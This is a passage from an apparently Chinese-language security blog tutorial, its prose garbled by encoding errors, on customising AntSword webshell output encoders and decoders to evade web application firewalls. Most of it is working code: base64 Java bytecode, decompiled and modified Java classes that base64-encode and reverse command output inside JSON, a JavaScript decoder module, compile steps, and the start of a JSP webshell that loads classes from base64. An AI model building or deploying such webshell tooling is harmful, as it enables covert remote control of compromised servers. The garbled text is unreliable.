class="line">yv66vgAAADEAHgoACAATBwAUCgACABUKAAIAFgoAAgAXCQAHABgHABkHABoBAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBABRBc291dHB1dFJldmVyc2UuamF2YQwACwAbAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgwACwAMDAAcAB0MAA8AEAwACQAKAQATc3JjL0Fzb3V0cHV0UmV2ZXJzZQEAEGphdmEvbGFuZy9PYmplY3QBAAMoKVYBAAdyZXZlcnNlAQAaKClMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsAIQAHAAgAAAABAAAACQAKAAAAAgABAAsADAABAA0AAAA3AAQAAgAAABcqtwABKrsAAlkrtwADtgAEtgAFtQAGsQAAAAEADgAAAA4AAwAAAAQABAAFABYABgABAA8AEAABAA0AAAAdAAEAAQAAAAUqtAAGsAAAAAEADgAAAAYAAQAAAAkAAQARAAAAAgAS</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AsoutputReverse</span> </span>&#123;</span><br><span class="line">    String res;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AsoutputReverse</span><span class="params">(String var1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.res = (<span class="keyword">new</span> StringBuffer(var1)).reverse().toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">å­—èŠ‚ç çš„åç¼–è¯‘å¯ä»¥æ¸…æ™°çš„çœ‹åˆ°å®šä¹‰äº†ä¸€ä¸ªç±»,åœ¨AsoutputReverseæ–¹æ³•ä¸­å°†resé€†åºã€‚</span><br><span class="line">é‚£ä¹ˆæˆ‘ä»¬ä»¿å†™ä¸€ä¸ªå³å¯ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">èšå‰‘åŸç‰ˆjspbase64è§£ç </span><br><span class="line">yv66vgAAADEAWQoADgAnCgAaACgJABoAKQgAKgoAKwAsCAAtCAAuCgAUAC8IADAKAAwAMQgAMgcAMwoADAA0BwA1CgA2ADcKAA4AOAgAOQcAOgoAFAA7BwA8CAA9CgAMAD4KAD8AQAgAQQcAQgcAQwEAA3JlcwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABjxpbml0PgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAxCYXNlNjRFbmNvZGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQATQXNvdXRwdXRCYXNlNjQuamF2YQwAHQBEDAAhACIMABsAHAEADGphdmEudmVyc2lvbgcARQwARgAiAQAAAQADMS45DABHAEgBABBqYXZhLnV0aWwuQmFzZTY0DABJAEoBAApnZXRFbmNvZGVyAQAPamF2YS9sYW5nL0NsYXNzDABLAEwBABBqYXZhL2xhbmcvT2JqZWN0BwBNDABOAE8MAFAAUQEADmVuY29kZVRvU3RyaW5nAQACW0IMAFIAUwEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDABUAFUHAFYMAFcAWAEABmVuY29kZQEAE2phdmEvbGFuZy9FeGNlcHRpb24BABJzcmMvQXNvdXRwdXRCYXNlNjQBAAMoKVYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAljb21wYXJlVG8BABUoTGphdmEvbGFuZy9TdHJpbmc7KUkBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAhnZXRCeXRlcwEABCgpW0IBABZnZXREZWNsYXJlZENvbnN0cnVjdG9yAQAzKFtMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAdamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3IBAAtuZXdJbnN0YW5jZQEAJyhbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwAhABoADgAAAAEAAAAbABwAAAADAAEAHQAeAAEAHwAAAC4AAwACAAAADiq3AAEqKiu2AAK1AAOxAAAAAQAgAAAADgADAAAABAAEAAUADQAGAAEAIQAiAAEAHwAAAPAABgAGAAAAoBIEuAAFTRIGTiwSB7YACJsASxIJuAAKOgQZBBILA70ADLYADRkEA70ADrYADzoFGQW2ABASEQS9AAxZAxMAElO2AA0ZBQS9AA5ZAyu2ABNTtgAPwAAUTqcARBIVuAAKOgQZBAO9AAy2ABYDvQAOtgAXOgUZBbYAEBIYBL0ADFkDEwASU7YADRkFBL0ADlkDK7YAE1O2AA/AABROLbBOK7AAAQAGAJwAnQAZAAEAIAAAADYADQAAAAgABgAKAAkACwASAAwAGQANAC8ADgBXAA8AWgAQAGEAEQBzABIAmwAUAJ0AFQCeABYAAQAjACQAAQAfAAAAHQABAAEAAAAFKrQAA7AAAAABACAAAAAGAAEAAAAbAAEAJQAAAAIAJg==</span><br><span class="line"></span><br><span class="line">è§£å‡ºæ¥çš„å­—èŠ‚ä¸º</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AsoutputBase64</span> </span>&#123;</span><br><span class="line">    String res;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AsoutputBase64</span><span class="params">(String var1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.res = <span class="keyword">this</span>.Base64Encode(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">Base64Encode</span><span class="params">(String var1)</span> </span>&#123;</span><br><span class="line">        String var2 = System.getProperty(<span class="string">&quot;java.version&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String var3 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            Class var4;</span><br><span class="line">            Object var5;</span><br><span class="line">            <span class="keyword">if</span> (var2.compareTo(<span class="string">&quot;1.9&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                var4 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">                var5 = var4.getMethod(<span class="string">&quot;getEncoder&quot;</span>).invoke(var4);</span><br><span class="line">                var3 = (String)var5.getClass().getMethod(<span class="string">&quot;encodeToString&quot;</span>, <span class="keyword">byte</span>[].class).invoke(var5, var1.getBytes());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                var4 = Class.forName(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>);</span><br><span class="line">                var5 = var4.getDeclaredConstructor().newInstance();</span><br><span class="line">                var3 = (String)var5.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="keyword">byte</span>[].class).invoke(var5, var1.getBytes());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> var3;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è·Ÿphpä¸€æ ·ï¼Œå…ˆå°†ç»“æœè¿›è¡Œbase64ç¼–ç ï¼Œç„¶åé€†åºï¼Œç„¶åç»™åˆ°jsonçš„æ ¼å¼å³å¯,<br>javaçš„ä»£ç ä¸ºä¸‹é¢çš„ç»“æœï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">package src;</span><br><span class="line"></span><br><span class="line">public class AsoutputBase64 &#123;</span><br><span class="line">    String res;</span><br><span class="line"></span><br><span class="line">    public AsoutputBase64(String var1) &#123;</span><br><span class="line">        this.res = this.Base64Encode(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String Base64Encode(String var1) &#123;</span><br><span class="line">        String var2 = System.getProperty(&quot;java.version&quot;);</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            String var3 = &quot;&quot;;</span><br><span class="line">            Class var4;</span><br><span class="line">            Object var5;</span><br><span class="line">            if (var2.compareTo(&quot;1.9&quot;) &gt;= 0) &#123;</span><br><span class="line">                var4 = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">                var5 = var4.getMethod(&quot;getEncoder&quot;).invoke(var4);</span><br><span class="line">                var3 = (String)var5.getClass().getMethod(&quot;encodeToString&quot;, byte[].class).invoke(var5, var1.getBytes());</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                var4 = Class.forName(&quot;sun.misc.BASE64Encoder&quot;);</span><br><span class="line">                var5 = var4.getDeclaredConstructor().newInstance();</span><br><span class="line">                var3 = (String)var5.getClass().getMethod(&quot;encode&quot;, byte[].class).invoke(var5, var1.getBytes());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return var3;</span><br><span class="line">        &#125; catch (Exception var6) &#123;</span><br><span class="line">            return var1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;&#123;\&quot;message\&quot;:\&quot;&quot; + (new StringBuilder(this.res)).reverse().toString().replaceAll(&quot;\\r\\n|\\r|\\n&quot;, &quot;&quot;) + &quot;\&quot;&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘è¿™é‡Œæ²¡æœ‰æ”¹ç±»åï¼Œä¸€æ ·ç”¨ï¼Œè¿™é‡Œreturnçš„æ—¶å€™ï¼Œæ›¿æ¢äº†ç©ºè¡Œå’Œç©ºæ ¼ï¼Œä¸ºä»€ä¹ˆå‘¢<br>ç¬”è€…åœ¨æµ‹è¯•çš„æ—¶å€™<br><img src="/images/antsword-bypasswaf/image-20240307145654461.png" alt="image-20240307145654461"></p><p>è¿”å›ç»“æœç›´æ¥å°±å¸¦å›è½¦ç¬¦ï¼Œä¸ç†è§£javaï¼Œæ‰€ä»¥ç›´æ¥ç»™ä»–æ›¿æ¢ä¸ºç©ºã€‚<br>ä¸‹é¢æ˜¯ç¼–è¯‘ï¼Œç¼–è¯‘ä¸€å®šè¦æ³¨æ„ï¼Œç¬”è€…åœ¨è¿™é‡Œç ”ç©¶äº†å¾ˆä¹…ï¼Œèµ·åˆç¼–è¯‘å®Œçš„ç»“æœï¼Œæ‰“å‡ºå»åï¼Œè¿˜æ˜¯é»˜è®¤çš„è§£ç ï¼Œåˆå»æ‰¾èµ„æ–™ï¼Œåœ¨<a href="https://yzddmr6.com/posts/antsword-diy-3/%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E4%B8%AD%E6%89%BE%E5%88%B0%E4%BA%86%E7%AD%94%E6%A1%88%EF%BC%8C%E8%BF%99%E4%B8%AA%E5%A4%A7%E5%B8%88%E5%82%85%E8%AF%B4%EF%BC%8C%E8%A6%81%E7%9F%A5%E9%81%93java%E6%98%AF%E5%90%91%E4%B8%8B%E5%85%BC%E5%AE%B9%E7%9A%84%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E8%AF%B4jdk1.6%E7%BC%96%E8%AF%91%E5%87%BA%E6%9D%A5%E7%9A%84%E5%AD%97%E8%8A%82%E7%A0%81%E5%9C%A81.8%E4%B8%8A%E5%8F%AF%E4%BB%A5%E8%BF%90%E8%A1%8C%EF%BC%8C%E4%BD%86%E6%98%AF1.8%E7%9A%84%E5%AD%97%E8%8A%82%E7%A0%81%E5%9C%A81.6%E4%B8%8A%E5%B0%B1%E4%B8%8D%E4%B8%80%E5%AE%9A%E8%B7%91%E5%BE%97%E8%B5%B7%E6%9D%A5%E3%80%82%E6%89%80%E4%BB%A5%E5%9C%A8%E5%AE%9E%E7%8E%B0%E7%9A%84%E6%97%B6%E5%80%99%E9%87%87%E7%94%A8%E4%BA%86jdk1.6%E7%BC%96%E8%AF%91%EF%BC%8C%E4%BE%9D%E8%B5%96%E7%9A%84jar%E5%8C%85%E4%B9%9F%E9%87%87%E7%94%A8%E4%BA%86%E8%B7%9F%E5%86%B0%E8%9D%8E%E7%9B%B8%E5%90%8C%E7%9A%84tomcat7%E7%9A%84jar%E3%80%82">https://yzddmr6.com/posts/antsword-diy-3/è¿™ç¯‡æ–‡ç« ä¸­æ‰¾åˆ°äº†ç­”æ¡ˆï¼Œè¿™ä¸ªå¤§å¸ˆå‚…è¯´ï¼Œè¦çŸ¥é“javaæ˜¯å‘ä¸‹å…¼å®¹çš„ï¼Œä¹Ÿå°±æ˜¯è¯´jdk1.6ç¼–è¯‘å‡ºæ¥çš„å­—èŠ‚ç åœ¨1.8ä¸Šå¯ä»¥è¿è¡Œï¼Œä½†æ˜¯1.8çš„å­—èŠ‚ç åœ¨1.6ä¸Šå°±ä¸ä¸€å®šè·‘å¾—èµ·æ¥ã€‚æ‰€ä»¥åœ¨å®ç°çš„æ—¶å€™é‡‡ç”¨äº†jdk1.6ç¼–è¯‘ï¼Œä¾èµ–çš„jaråŒ…ä¹Ÿé‡‡ç”¨äº†è·Ÿå†°èç›¸åŒçš„tomcat7çš„jarã€‚</a><br>é‚£ä¹ˆç¬”è€…çš„ç¯å¢ƒæ˜¯jdk1.8æˆ‘ç›¸ä¿¡å¤§å¤šæ•°å°ä¼™ä¼´çš„ç¯å¢ƒåº”è¯¥ä¹Ÿæ˜¯1.8ï¼Œè¿™é‡Œä¸€å®šè¦ç”¨1.6çš„ç¯å¢ƒè¿›è¡Œç¼–è¯‘ã€‚å…¶ä»–ç‰ˆæœ¬æœ‰ç¼–è¯‘å‡ºæ¥æœ‰ç»†å¾®çš„å·®åˆ«ï¼Œè€Œä¸”ä¸å¯ä»¥ç”¨ã€‚<br>éšä¾¿å»ç½‘ä¸Šæ‰¾ä¸€ä¸ªå°±å¯ä»¥äº†ï¼Œæˆ‘ç”¨çš„è¿™ä¸ª,æ˜¯jdkï¼Œä¸æ˜¯jre<code>https://blog.csdn.net/sanqima/article/details/44946327</code><br>è£…å¥½ä¹‹åæˆ‘ä»¬ç¼–è¯‘ï¼Œå°†ä¸Šé¢çš„javaä»£ç å‘½åä¸ºjavaåç¼€ï¼Œæ–‡ä»¶åå’Œä¸»ç±»ä¸€è‡´<br><img src="/images/antsword-bypasswaf/image-20240307150357031.png" alt="image-20240307150357031"></p><p>é‚£ä¹ˆç›´æ¥<code>.\javac.exe AsoutputBase64.java</code>å³å¯ï¼ŒæŠ¥é”™ä¸ç”¨ç®¡<br>ç„¶ååœ¨<code>base64 -w 0 AsoutputBase64.class</code><br><img src="/images/antsword-bypasswaf/image-20240307150527997.png" alt="image-20240307150527997"></p><p>æˆ‘è¿™é‡Œæ˜¯gitçš„ç¯å¢ƒï¼Œæ²¡æœ‰çš„å°±æ‹–ä¸€ä¸‹linuxï¼Œä¸€æ ·çš„ã€‚<br>ç„¶åæŠŠæ‹¿åˆ°çš„ç»“æœæ›¿æ¢ä¸€ä¸‹<br><img src="/images/antsword-bypasswaf/image-20240307150642027.png" alt="image-20240307150642027"></p><p>ä¸‹é¢å°±æ­£å¸¸å†™ï¼Œå…ˆæ­£åˆ™æ¢æ‰messageï¼Œç„¶åé€†åºï¼Œæœ€åè§£base64ï¼Œdataè®°å¾—æ›¿æ¢æˆbuff</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * JSP::reverse è§£ç å™¨</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"> &#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">module</span>.exports = &#123;</span><br><span class="line">   <span class="attr">asoutput</span>: <span class="function">(<span class="params">ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * ext = &#123;</span></span><br><span class="line"><span class="comment">      *   opts: ç±»å‹ä¸º Object, Shell é…ç½®</span></span><br><span class="line"><span class="comment">      * &#125;</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     <span class="keyword">return</span> <span class="string">`yv66vgAAADIAeAoADgA3CgAkADgJACQAOQgAOgoAOwA8CAA9CAA+CgAUAD8IAEAKAAwAQQgAQgcAQwoADABEBwBFCgBGAEcKAA4ASAgASQcASgoAFABLBwBMCABNCgAMAE4KAE8AUAgAUQcAUgcAUwoAGgA3CABUCgAaAFUKABoAVgoAGgBXCgAaAFgIAFkKABQAWggAWwcAXAEAA3JlcwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABjxpbml0PgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAxCYXNlNjRFbmNvZGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHAEwHAEMHAEUHAFwHAFIBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEAE0Fzb3V0cHV0QmFzZTY0LmphdmEMACcAXQwAKwAsDAAlACYBAAxqYXZhLnZlcnNpb24HAF4MAF8ALAEAAAEAAzEuOQwAYABhAQAQamF2YS51dGlsLkJhc2U2NAwAYgBjAQAKZ2V0RW5jb2RlcgEAD2phdmEvbGFuZy9DbGFzcwwAZABlAQAQamF2YS9sYW5nL09iamVjdAcAZgwAZwBoDABpAGoBAA5lbmNvZGVUb1N0cmluZwEAAltCDABrAGwBABBqYXZhL2xhbmcvU3RyaW5nAQAWc3VuLm1pc2MuQkFTRTY0RW5jb2RlcgwAbQBuBwBvDABwAHEBAAZlbmNvZGUBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBAAx7Im1lc3NhZ2UiOiIMAHIAcwwAJwAoDAB0AHUMADMANAEAClxyXG58XHJ8XG4MAHYAdwEAAiJ9AQASc3JjL0Fzb3V0cHV0QmFzZTY0AQADKClWAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQAJY29tcGFyZVRvAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAWZ2V0RGVjbGFyZWRDb25zdHJ1Y3RvcgEAMyhbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yAQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAdyZXZlcnNlAQAbKClMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAKcmVwbGFjZUFsbAEAOChMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7ACEAJAAOAAAAAQAAACUAJgAAAAMAAQAnACgAAQApAAAALgADAAIAAAAOKrcAASoqK7YAArUAA7EAAAABACoAAAAOAAMAAAAGAAQABwANAAgAAQArACwAAQApAAABGQAGAAYAAACgEgS4AAVNEgZOLBIHtgAImwBLEgm4AAo6BBkEEgsDvQAMtgANGQQDvQAOtgAPOgUZBbYAEBIRBL0ADFkDEwASU7YADRkFBL0ADlkDK7YAE1O2AA/AABROpwBEEhW4AAo6BBkEA70ADLYAFgO9AA62ABc6BRkFtgAQEhgEvQAMWQMTABJTtgANGQUEvQAOWQMrtgATU7YAD8AAFE4tsE4rsAABAAYAnACdABkAAgAqAAAAMgAMAAAACwAGAA4ACQARABIAEgAZABMALwAUAFoAFgBhABcAcwAYAJsAGwCdABwAngAdAC0AAAAnAAP9AFoHAC4HAC79AEAHAC8HADD/AAEAAwcAMQcALgcALgABBwAyAAEAMwA0AAEAKQAAAEgABAABAAAAMLsAGlm3ABsSHLYAHbsAGlkqtAADtwAetgAftgAgEiESBrYAIrYAHRIjtgAdtgAgsAAAAAEAKgAAAAYAAQAAACIAAQA1AAAAAgA2`</span>;</span><br><span class="line">   &#125;,</span><br><span class="line">   <span class="attr">decode_buff</span>: <span class="function">(<span class="params">buff</span>) =&gt;</span> &#123;</span><br><span class="line">     <span class="keyword">let</span> res = Buffer.from(buff.toString().replace(<span class="regexp">/&#123;&quot;message&quot;:&quot;/g</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="regexp">/&quot;&#125;/g</span>,<span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">   </span><br><span class="line">     <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·è¯å†å»æ‰§è¡Œå³å¯ï¼Œ<br><img src="/images/antsword-bypasswaf/image-20240307162737769.png" alt="image-20240307162737769"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°messageçš„å‰é¢è¿˜æ˜¯æœ‰å­—ç¬¦ï¼Œæœ‰ç‚¹ä¸‘é™‹ï¼Œ<br>æˆ‘ä»¬åœ¨jspä¸‹çš„index.jsä¸­ç»™ä»–ä¿®æ”¹ä¸ºç©ºï¼Œé‚£ä¹ˆå°±å¯ä»¥äº†ã€‚<br><img src="/images/antsword-bypasswaf/image-20240307162904197.png" alt="image-20240307162904197"></p><p><img src="/images/antsword-bypasswaf/image-20240307162650259.png" alt="image-20240307162650259"></p><p>è§£ç å’Œç¼–ç å…ˆå†™åˆ°è¿™é‡Œå§ï¼Œç›¸ä¿¡å°ä¼™ä¼´ä»¬å·²ç»çŸ¥é“æ˜¯æ€ä¹ˆå›äº‹äº†ï¼Œå¯ä»¥ç…§ç€è‡ªå·±çš„æ€è·¯æ›´æ”¹äº†ã€‚<br>æ”¾ä¸‹ä»£ç æ–¹ä¾¿ä½¿ç”¨</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">webshell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="title">U</span>(<span class="params">ClassLoader c</span>)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public Class <span class="function"><span class="title">g</span>(<span class="params">byte[] b</span>)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public byte[] base64Decode(<span class="built_in">String</span> str) throws Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clazz = Class.forName(<span 